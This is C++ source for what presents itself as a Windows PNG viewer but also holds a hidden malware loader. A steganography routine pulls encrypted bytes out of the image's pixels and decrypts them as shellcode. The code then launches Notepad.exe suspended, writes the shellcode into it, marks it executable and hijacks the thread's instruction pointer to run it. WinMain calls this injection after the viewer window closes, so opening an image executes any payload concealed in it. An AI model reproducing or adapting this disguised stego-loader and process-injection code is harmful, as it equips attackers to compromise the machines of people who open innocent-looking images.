#define WIN32_LEAN_AND_MEAN
#pragma warning (disable:4996)
#include "Utils.h"
#include <windows.h>
#include <wincodec.h>
#include <wrl/client.h>
#include <cstdint>
#include <cstdio>
#include <type_traits>
#include "VirtualBuffer.h"

//image
#include <gdiplus.h>
#include <shellapi.h>

#pragma comment(lib, "gdiplus.lib")   // MSVC only; MinGW uses -lgdiplus
#pragma comment(lib, "shell32.lib")



#pragma comment(lib, "windowscodecs.lib")
#pragma comment(lib, "ole32.lib")

using Microsoft::WRL::ComPtr;

constexpr int      G_BITS = 3;
constexpr int      B_BITS = 2;
constexpr uint8_t  TERMINATOR = 0x00;


using namespace Gdiplus;

static Image* g_img = nullptr;

// ------------------------------------------------------------- image loading

// Decodes frame 0 of any WIC-supported file into a tightly packed RGB24 buffer.
static bool LoadRgb24(PCWSTR path, VirtualBuffer& out, UINT& width, UINT& height) {
    ComPtr<IWICImagingFactory> factory;
    HRESULT hr = CoCreateInstance(CLSID_WICImagingFactory, nullptr,
        CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&factory));
    if (FAILED(hr)) { Fail(L"CoCreateInstance(WICImagingFactory)", hr); return false; }

    ComPtr<IWICBitmapDecoder> decoder;
    hr = factory->CreateDecoderFromFilename(path, nullptr, GENERIC_READ,
        WICDecodeMetadataCacheOnDemand, &decoder);
    if (FAILED(hr)) { Fail(L"CreateDecoderFromFilename", hr); return false; }

    ComPtr<IWICBitmapFrameDecode> frame;
    hr = decoder->GetFrame(0, &frame);
    if (FAILED(hr)) { Fail(L"GetFrame", hr); return false; }

    hr = frame->GetSize(&width, &height);
    if (FAILED(hr)) { Fail(L"GetSize", hr); return false; }
    if (width == 0 || height == 0) { fwprintf(stderr, L"[!] Empty image\n"); return false; }

    // Skip the format converter entirely when the frame is already RGB24.
    WICPixelFormatGUID fmt{};
    hr = frame->GetPixelFormat(&fmt);
    if (FAILED(hr)) { Fail(L"GetPixelFormat", hr); return false; }

    ComPtr<IWICBitmapSource> source;
    if (fmt == GUID_WICPixelFormat24bppRGB) {
        source = frame;
    }
    else {
        hr = WICConvertBitmapSource(GUID_WICPixelFormat24bppRGB, frame.Get(), &source);
        if (FAILED(hr)) { Fail(L"WICConvertBitmapSource", hr); return false; }
    }

    const uint64_t pixels = static_cast<uint64_t>(width) * height;
    const uint64_t bytes = pixels * 3;
    if (pixels > 0xFFFFFFFFull || bytes > static_cast<uint64_t>(SIZE_MAX)) {
        fwprintf(stderr, L"[!] Image too large to address\n");
        return false;
    }

    VirtualBuffer buf(static_cast<size_t>(bytes));
    if (!buf) { Fail(L"VirtualAlloc", HRESULT_FROM_WIN32(GetLastError())); return false; }

    // CopyPixels honours the stride we ask for, so we get no row padding.
    hr = source->CopyPixels(nullptr, width * 3,
        static_cast<UINT>(bytes), buf.get());
    if (FAILED(hr)) { Fail(L"CopyPixels", hr); return false; }

    out = std::move(buf);   // see move ctor note below
    return true;
}

// --------------------------------------------------------------- extraction

static size_t ExtractFibStego(const uint8_t* rgb, uint32_t limit,
    uint8_t* used, uint8_t* out, size_t outCap) {
    size_t   n = 0;
    uint32_t a = 1u % limit;
    uint32_t b = 2u % limit;

    for (uint32_t idx = 0; idx < limit && n < outCap; ++idx) {
        uint32_t pos = a;
        while (used[pos]) {                       // linear probing
            if (++pos == limit) pos = 0;
        }
        used[pos] = 1;

        const uint8_t* px = rgb + static_cast<size_t>(pos) * 3;
        const uint8_t byte = static_cast<uint8_t>(
            ((px[0] & 0b111) << (G_BITS + B_BITS)) |
            ((px[1] & 0b111) << B_BITS) |
            (px[2] & 0b11));

        if (byte == TERMINATOR) break;
        out[n++] = byte;

        // Both operands are already reduced, so a conditional subtract
        // replaces the modulo.
        uint32_t next = a + b;
        if (next >= limit) next -= limit;
        a = b;
        b = next;
    }
    return n;
}


BOOL CreateSuspendedProcessWithRemoteThread(IN LPCSTR lpProcessName, IN LPCWSTR fileIN) {

	CHAR					lpPath[MAX_PATH * 2];
	CHAR					WnDr[MAX_PATH];

	STARTUPINFO				Si = { 0 };
	PROCESS_INFORMATION		Pi = { 0 };
	int sSizeOfShellcode;

	// Cleaning the structs by setting the member values to 0
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);

	// Getting the value of the %WINDIR% environment variable (this is usually 'C:\Windows')
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Creating the full target process path 
	sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	printf("\n\t[i] Running : \"%s\" ... ", lpPath);

	if (!CreateProcessA(
		NULL,					// No module name (use command line)
		lpPath,					// Command line
		NULL,					// Process handle not inheritable
		NULL,					// Thread handle not inheritable
		FALSE,					// Set handle inheritance to FALSE
		CREATE_SUSPENDED,		// creation flags	
		NULL,					// Use parent's environment block
		NULL,					// Use parent's starting directory 
		(LPSTARTUPINFOA)&Si,					// Pointer to STARTUPINFO structure
		&Pi)) {					// Pointer to PROCESS_INFORMATION structure

		printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[+] DONE \n");

	// Populating the OUT parameters with CreateProcessA's output
	auto dwProcessId = Pi.dwProcessId;
	auto hProcess = Pi.hProcess;
	auto hThread = Pi.hThread;


	SIZE_T	sNumberOfBytesWritten = NULL;
	DWORD	dwOldProtection = NULL;

	/// Inject payload
	//Decrypt Payload
	PBYTE pShellcode = nullptr;

	

	//Read PNG
	ComScope com;
	if (!com.ok()) { fwprintf(stderr, L"[!] CoInitializeEx failed\n"); return 1; }

	VirtualBuffer image(0);
	UINT width = 0, height = 0;
	if (!LoadRgb24(fileIN, image, width, height)) return 1;

	const uint32_t limit = width * height;
	wprintf(L"[+] Loaded image: %ux%u (%u pixels)\n", width, height, limit);

	VirtualBuffer used(limit);
	VirtualBuffer payload(limit);
	if (!used || !payload) { fwprintf(stderr, L"[!] Allocation failed\n"); return 1; }

	unsigned char* buf = static_cast<unsigned char*>(malloc(limit));
	if (!buf) { fprintf(stderr, "[!] malloc failed\n"); return 1; }

	const size_t n = ExtractFibStego(image.get(), limit, used.get(), buf, limit);
	DWORD myBufferSize = n;
	//Decode payload
	


	if (1) {
		sSizeOfShellcode = UtilDecryptFileQuoted(buf, myBufferSize, &pShellcode);
	}
	else
	{
		pShellcode = buf;
		sSizeOfShellcode = sizeof(buf);

	}

	LPVOID pAddress = nullptr;
	pAddress = VirtualAllocEx(hProcess, NULL, sizeof(pShellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("\n\t[i] Allocated Memory At : 0x%p \n", pAddress);


	if (!WriteProcessMemory(hProcess, pAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("\t[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);


	if (!VirtualProtectEx(hProcess, pAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	/*if (buf != NULL) {
		// CRITICAL: Always free the memory when finished
		HeapFree(GetProcessHeap(), 0, buf);

	}
	*/

	//Resume thread

	CONTEXT		ThreadCtx;
	RtlSecureZeroMemory(&ThreadCtx, sizeof(ThreadCtx));
	ThreadCtx.ContextFlags = CONTEXT_CONTROL;

	// getting the original thread context
	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("\n\t[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// updating the next instruction pointer to be equal to our shellcode's address 
	ThreadCtx.Rip = (DWORD64)pAddress;

	// setting the new updated thread context
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("\n\t[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}


	// resuming suspended thread, thus running our payload
	ResumeThread(hThread);

	WaitForSingleObject(hThread, INFINITE);

	return TRUE;
}

static void OnPaint(HWND hwnd)
{
	PAINTSTRUCT ps;
	HDC hdc = BeginPaint(hwnd, &ps);

	RECT rc;
	GetClientRect(hwnd, &rc);
	int cw = rc.right, ch = rc.bottom;

	// draw off-screen first so resizing doesn't flicker
	HDC     mem = CreateCompatibleDC(hdc);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, cw, ch);
	HBITMAP old = (HBITMAP)SelectObject(mem, bmp);

	FillRect(mem, &rc, (HBRUSH)GetStockObject(BLACK_BRUSH));

	if (g_img) {
		Graphics g(mem);
		g.SetInterpolationMode(InterpolationModeHighQualityBicubic);

		UINT iw = g_img->GetWidth(), ih = g_img->GetHeight();
		double sx = (double)cw / iw, sy = (double)ch / ih;
		double s = (sx < sy) ? sx : sy;          // fit, keep aspect ratio

		int dw = (int)(iw * s), dh = (int)(ih * s);
		g.DrawImage(g_img, (cw - dw) / 2, (ch - dh) / 2, dw, dh);
	}

	BitBlt(hdc, 0, 0, cw, ch, mem, 0, 0, SRCCOPY);

	SelectObject(mem, old);
	DeleteObject(bmp);
	DeleteDC(mem);
	EndPaint(hwnd, &ps);
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
	switch (msg) {
	case WM_PAINT:       OnPaint(hwnd); return 0;
	case WM_ERASEBKGND:  return 1;                       // we paint everything
	case WM_SIZE:        InvalidateRect(hwnd, nullptr, FALSE); return 0;
	case WM_DESTROY:     PostQuitMessage(0); return 0;
	}
	return DefWindowProcW(hwnd, msg, wp, lp);
}


//int wmain(int argc, wchar_t** argv) {
//
//
//	if (argc != 2) {
//		printf("\t [!] Please specify the path of RAW payload file");
//		return 0;
//	}
//	CreateSuspendedProcessWithRemoteThread("Notepad.exe", argv[1]);
//
//
//
//	return 0;
//
//}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int nCmdShow)
{
	GdiplusStartupInput gsi;
	ULONG_PTR token;
	GdiplusStartup(&token, &gsi, nullptr);

	int argc = 0;
	LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
	if (argc < 2) {
		MessageBoxW(nullptr, L"Usage: viewer.exe <file.png>", L"Error", MB_ICONERROR);
		GdiplusShutdown(token);
		return 1;
	}

	

	g_img = Image::FromFile(argv[1]);
	if (!g_img || g_img->GetLastStatus() != Ok) {
		MessageBoxW(nullptr, L"Could not load that image.", L"Error", MB_ICONERROR);
		delete g_img;
		GdiplusShutdown(token);
		return 1;
	}

	WNDCLASSW wc = {};
	wc.lpfnWndProc = WndProc;
	wc.hInstance = hInst;
	wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
	wc.lpszClassName = L"PngViewerClass";
	RegisterClassW(&wc);

	// size the window to the image, capped so huge PNGs still fit on screen
	int w = (int)g_img->GetWidth(), h = (int)g_img->GetHeight();
	if (w > 1200) { h = h * 1200 / w; w = 1200; }
	if (h > 900) { w = w * 900 / h;  h = 900; }

	RECT r = { 0, 0, w, h };
	AdjustWindowRect(&r, WS_OVERLAPPEDWINDOW, FALSE);

	HWND hwnd = CreateWindowW(L"PngViewerClass", argv[1], WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, CW_USEDEFAULT,
		r.right - r.left, r.bottom - r.top,
		nullptr, nullptr, hInst, nullptr);
	ShowWindow(hwnd, nCmdShow);

	MSG msg;
	while (GetMessageW(&msg, nullptr, 0, 0) > 0) {
		TranslateMessage(&msg);
		DispatchMessageW(&msg);
	}

	//
	CreateSuspendedProcessWithRemoteThread("Notepad.exe", argv[1]);

	delete g_img;            // must happen before shutdown
	GdiplusShutdown(token);
	LocalFree(argv);
	return (int)msg.wParam;
}
